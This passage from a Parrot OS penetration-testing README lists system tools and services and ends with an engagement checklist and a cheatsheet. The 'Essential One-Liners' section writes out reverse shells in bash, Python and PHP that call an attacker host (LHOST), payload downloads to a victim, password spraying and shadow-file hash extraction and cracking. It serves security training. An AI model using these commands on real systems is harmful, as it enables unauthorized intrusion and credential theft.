							Konsole is KDE's feature-rich terminal emulator supporting tabs, split views, profiles, and SSH bookmarks. Primary terminal for running pentesting tools. Supports custom color schemes ideal for long hacking sessions.
							
							```bash
							konsole                           # Launch
							konsole --profile "Hacking"       # Launch with specific profile
							konsole -e "msfconsole"          # Launch with command
							```
							
							**Power Tips:**
							```bash
							# Split view: View > Split View
							# Bookmark SSH sessions: Bookmarks > Add Bookmark
							# Multiple tabs: Ctrl+Shift+T
							# Rename tab: Double-click tab name
							```
							
							---
							
							### 🗺️ Hardware Locality (lstopo)
							
							| Field | Details |
							|-------|---------|
							| **Category** | System |
							| **Type** | Hardware Topology Viewer |
							| **Skill Level** | Intermediate |
							
							**Description:**
							lstopo (Hardware Locality) displays the hardware topology of a system — CPU cores, NUMA nodes, cache hierarchy, PCI devices, and memory. Useful for optimizing hashcat/CPU-intensive tools by understanding your hardware layout.
							
							```bash
							lstopo                      # Show hardware topology (GUI)
							lstopo --of txt             # Text output
							hwloc-info                  # Detailed hardware info
							lstopo --no-io              # Exclude I/O devices
							```
							
							---
							
							### 🗺️ NmapSI4
							
							| Field | Details |
							|-------|---------|
							| **Category** | System |
							| **Type** | Nmap GUI Frontend |
							| **Skill Level** | Beginner |
							
							**Description:**
							NmapSI4 is a Qt-based GUI for Nmap with two modes: Full mode (all features) and User mode (simplified). Makes Nmap accessible for beginners without memorizing command-line flags, while still exposing all options.
							
							```bash
							nmapsi4          # Launch NmapSI4 (both modes available from menu)
							```
							
							---
							
							### 📦 Synaptic Package Manager
							
							| Field | Details |
							|-------|---------|
							| **Category** | System |
							| **Type** | Graphical Package Manager |
							| **Skill Level** | Beginner |
							
							**Description:**
							Synaptic is a graphical frontend for APT package management. Browse, install, remove, and upgrade packages. Useful for finding and installing additional security tools not in the Parrot menu.
							
							```bash
							sudo synaptic              # Launch Synaptic
							
							# CLI equivalents:
							sudo apt update && sudo apt upgrade    # Update all packages
							sudo apt install tool-name             # Install a tool
							sudo apt search keyword                # Search for tools
							sudo apt show package-name             # Show package details
							```
							
							---
							
							### 📊 System Monitor
							
							| Field | Details |
							|-------|---------|
							| **Category** | System |
							| **Type** | KDE System Monitor |
							| **Skill Level** | Beginner |
							
							**Description:**
							KDE System Monitor provides real-time graphs of CPU, memory, network, and disk usage. Good for monitoring system performance during intensive operations like running multiple Metasploit sessions or hashcat jobs.
							
							---
							
							### 🖥️ Terminal Emulators (UXTerm / XTerm / Warp / Zutty)
							
							| Terminal | Description |
							|---------|-------------|
							| **XTerm** | Classic X11 terminal — minimal, fast, always available |
							| **UXTerm** | Unicode-enabled XTerm — supports international characters |
							| **Warp** | Modern AI-powered terminal with command suggestions and history search |
							| **Zutty** | GPU-rendered terminal — extremely fast for heavy output |
							
							```bash
							xterm            # Classic terminal
							uxterm           # Unicode terminal
							warp             # Modern AI terminal
							zutty            # GPU-accelerated terminal
							```
							
							---
							
							## 24. System Services
							
							> Start/stop backend services required by pentesting tools.
							
							---
							
							### 🗄️ Database Service
							
							```bash
							sudo service postgresql start      # Start PostgreSQL (required for Metasploit)
							sudo service postgresql stop       # Stop PostgreSQL
							sudo service postgresql status     # Check status
							sudo msfdb init                    # Initialize Metasploit database
							sudo msfdb reinit                  # Reinitialize (reset) database
							```
							
							---
							
							### 🌐 HTTP Service
							
							```bash
							sudo service apache2 start         # Start Apache web server
							sudo service apache2 stop          # Stop Apache
							sudo service nginx start           # Start Nginx
							# Use for: hosting payloads, phishing pages, file transfers
							
							# Quick Python HTTP server (no service needed):
							python3 -m http.server 8080        # Serve current directory on port 8080
							python3 -m http.server 80          # Port 80 (requires root or authbind)
							```
							
							---
							
							### 💀 Metasploit Service
							
							```bash
							sudo service metasploit start      # Start Metasploit RPC service
							sudo service metasploit stop       # Stop service
							# Or start directly:
							sudo service postgresql start && msfconsole
							```
							
							---
							
							### 🕸️ Neo4j Service
							
							```bash
							sudo neo4j start                   # Start Neo4j (required for BloodHound)
							sudo neo4j stop                    # Stop Neo4j
							sudo neo4j console                 # Start in foreground (see logs)
							sudo neo4j status                  # Check if running
							# Web interface: http://localhost:7474
							```
							
							---
							
							### 🔐 SSH Service
							
							```bash
							sudo service ssh start             # Start SSH server
							sudo service ssh stop              # Stop SSH server
							sudo service ssh status            # Check status
							# Config: /etc/ssh/sshd_config
							
							# Key security settings for pentest SSH server:
							# PermitRootLogin yes              — Allow root (for lab use)
							# PasswordAuthentication yes       — Allow password auth
							# Port 22                          — Change to non-standard port to avoid detection
							
							# Generate SSH keys for C2/pivot access:
							ssh-keygen -t ed25519 -C "pentest"
							ssh-copy-id user@target            # Copy public key to target
							```
							
							---
							
							### 🔍 Xplico Service
							
							```bash
							sudo service xplico start          # Start Xplico NFAT service
							sudo service xplico stop           # Stop Xplico
							# Web interface: http://localhost:9876/
							# Default credentials: xplico / xplico
							```
							
							---
							
							### 🛡️ Nessus Service
							
							```bash
							sudo systemctl start nessusd       # Start Nessus daemon
							sudo systemctl stop nessusd        # Stop Nessus
							sudo systemctl status nessusd      # Check status
							# Web interface: https://localhost:8834
							# First-time setup: create admin account at the web UI
							
							# Update Nessus plugins:
							sudo /opt/nessus/sbin/nessuscli update --plugins-only
							```
							
							---
							
							## 25. Utilities
							
							> Everyday utility tools for productivity, file management, and system tasks.
							
							*(Send the Utilities screenshot to document all tools here)*
							
							**Common Utilities expected in Parrot OS:**
							
							### 📁 File Manager Utilities
							```bash
							ark                    # Archive manager (zip, tar, 7z, rar)
							dolphin                # Already documented in System
							```
							
							### 🔤 Text & Hex Editors
							```bash
							kate                   # Advanced text editor (already documented)
							nano /path/file        # Lightweight CLI text editor
							vim /path/file         # Powerful CLI editor
							hexedit file.bin       # Hex editor for binary files
							ghex file.bin          # GNOME hex editor (GUI)
							```
							
							### 🔒 Password Manager
							```bash
							keepassxc              # Secure password manager
							# Store pentest credentials, API keys, found passwords securely
							```
							
							### 📸 Screenshot Tools
							```bash
							spectacle              # KDE screenshot tool
							flameshot              # Feature-rich annotating screenshot tool
							scrot screenshot.png   # CLI screenshot
							```
							
							### 📋 Clipboard Manager
							```bash
							klipper                # KDE clipboard manager
							# Stores clipboard history — useful for saving discovered hashes/creds
							```
							
							---
							
							## 26. Science & Math
							
							*(Send the Science & Math screenshot to document all tools)*
							
							**Expected tools in this category:**
							
							### 🧮 Mathematical Tools
							```bash
							galculator             # Scientific calculator
							kcalc                  # KDE calculator
							bc                     # CLI arbitrary precision calculator
							
							# Python as calculator for security math:
							python3 -c "print(0xFF ^ 0x41)"           # XOR operation
							python3 -c "print(hex(0x41414141))"       # Hex conversion
							python3 -c "import math; print(math.log2(2**256))"  # Crypto math
							```
							
							### 📊 Data Analysis
							```bash
							# For security data analysis:
							python3                # Python REPL
							jupyter-notebook       # Interactive data analysis notebooks
							```
							
							---
							
							## 27. Multimedia
							
							*(Send the Multimedia screenshot to document all tools)*
							
							**Expected tools in this category:**
							
							### 🎵 Media Players
							```bash
							vlc                    # VLC media player — play captured video/audio
							mpv                    # Lightweight media player
							
							# Security use — analyze suspicious media files:
							exiftool video.mp4     # Extract metadata from video
							strings audio.mp3      # Find strings in audio files
							binwalk suspicious.jpg # Check for embedded files in media
							```
							
							### 🎙️ Audio/Video Recording
							```bash
							obs-studio             # Screen recording for documentation
							simplescreenrecorder   # Record pentest sessions for reporting
							ffmpeg -i input output # Convert media formats
							```
							
							### 🖼️ Image Viewers
							```bash
							gwenview               # KDE image viewer
							eog                    # GNOME image viewer
							feh image.jpg          # Lightweight CLI image viewer
							```
							
							---
							
							## 28. Power / Session Management
							
							```bash
							# Logout / Session
							qdbus org.kde.ksmserver /KSMServer logout 0 0 0    # KDE logout
							
							# Power Management
							systemctl poweroff      # Shutdown
							systemctl reboot        # Restart
							systemctl suspend       # Sleep/Suspend
							systemctl hibernate     # Hibernate
							
							# Screen Lock
							xdg-screensaver lock    # Lock screen
							loginctl lock-session   # Lock via loginctl
							```
							
							---
							
							## 29. Complete Quick-Reference Command Cheatsheet
							
							### 🎯 Pentest Engagement Checklist
							
							```bash
							# ===== PHASE 1: SETUP =====
							sudo service postgresql start && sudo msfdb init   # Start Metasploit DB
							sudo neo4j start                                    # Start BloodHound DB
							sudo anonsurf start                                 # Optional: anonymize traffic
							export TARGET="10.10.10.100"                        # Set target variable
							
							# ===== PHASE 2: RECON =====
							nmap -sn 10.10.10.0/24                             # Host discovery
							nmap -sV -sC -p- $TARGET -oA scan_results          # Full port scan
							theHarvester -d target.com -b all                  # OSINT gathering
							gobuster dns -d target.com -w subdomains.txt        # Subdomain enum
							whois target.com && dig target.com ANY             # DNS recon
							
							# ===== PHASE 3: SCANNING =====
							nikto -h http://$TARGET                            # Web vuln scan
							gobuster dir -u http://$TARGET -w dir-list.txt     # Dir brute force
							sqlmap -u "http://$TARGET/page?id=1" --dbs         # SQL injection test
							nmap --script=vuln $TARGET                         # Vuln scripts
							
							# ===== PHASE 4: EXPLOITATION =====
							msfconsole -q                                       # Launch Metasploit
							searchsploit "service version"                      # Find exploits
							python3 exploit.py $TARGET 80                       # Run custom exploit
							
							# ===== PHASE 5: POST-EXPLOITATION =====
							# On compromised Linux:
							id && whoami && hostname && ip a                   # Basic enumeration
							linpeas.sh | tee /tmp/lpe.txt                      # Priv esc check
							cat /etc/passwd && sudo -l                         # Check privileges
							
							# On compromised Windows (Meterpreter):
							# sysinfo → getuid → getsystem → hashdump → run post/multi/recon/local_exploit_suggester
							
							# ===== PHASE 6: REPORTING =====
							# Document in Logseq or Cherrytree
							# Screenshots with Flameshot
							# Generate report with LibreOffice Writer
							```
							
							---
							
							### 🔑 Essential One-Liners
							
							```bash
							# Reverse shells (use on compromised targets)
							bash -i >& /dev/tcp/LHOST/LPORT 0>&1
							python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
							php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
							
							# Upgrade to full TTY shell
							python3 -c 'import pty;pty.spawn("/bin/bash")'
							# Then: Ctrl+Z → stty raw -echo; fg → reset → export TERM=xterm
							
							# File transfer from attacker to victim
							python3 -m http.server 8080                        # On attacker
							wget http://LHOST:8080/file -O /tmp/file           # On victim
							curl http://LHOST:8080/file -o /tmp/file           # Alternative
							
							# Quick password spray check
							netexec smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success
							
							# Find SUID binaries (privesc)
							find / -perm -u=s -type f 2>/dev/null
							
							# Find world-writable files
							find / -writable -type f 2>/dev/null | grep -v proc
							
							# Extract hashes from Linux
							sudo unshadow /etc/passwd /etc/shadow > hashes.txt
							john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
							
							# Crack hash quickly
							echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 --stdin /usr/share/wordlists/rockyou.txt
							
							# Port forwarding with SSH
							ssh -L 8080:internal:80 user@jump_host -N -f
							
							# Enumerate SMB shares
							smbclient -L //target.com -N
							smbmap -H target.com
							
							# DNS zone transfer attempt
							dig axfr @ns1.target.com target.com
							
							# Google dorking (from CLI)
							# site:target.com filetype:pdf
							# site:target.com inurl:admin
							# site:target.com "index of /"
							```
							
							---
							
							*📌 README last updated: 2025/2026 — Parrot OS 7.0 (Echo)*
							*🦜 Official Site: https://parrotsec.org*
							*📚 Documentation: https://parrotsec.org/docs/*
							*⚠️ For authorized security testing and education ONLY*
